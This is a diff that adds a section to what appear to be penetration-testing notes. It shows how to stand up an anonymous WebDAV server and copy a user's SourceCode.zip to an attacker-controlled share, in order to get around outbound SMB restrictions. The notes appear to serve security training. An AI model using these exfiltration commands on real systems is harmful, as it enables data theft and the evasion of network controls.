@@ -229,6 +229,41 @@ Now decrypt the file
 echo <base64> | base64 -d -w 0 > hosts
 ```
 
+### SMB Uploads
+
+- Use WebDav alternative to run SMB over HTTP/HTTPS. 
+- You would use this if your org doesn't allow outbound SMB connections
+- The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring
+- When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP
+
+**Configuring the WebDav Server**
+
+**Install two python modules: wsgidav and cheroot**
+```
+sudo pip install wsgidav cheroot
+```
+
+**Using the WebDav Python module**
+```
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+**Connecting to the WebDav Share**
+```
+dir \\192.168.49.128\DavWWWRoot
+```
+**NOTE:** *DavWWWRoot* is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server.
+
+**Uploading Files using SMB**
+```
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+```
+```
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+**NOTE:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations
+
+
 
 
 
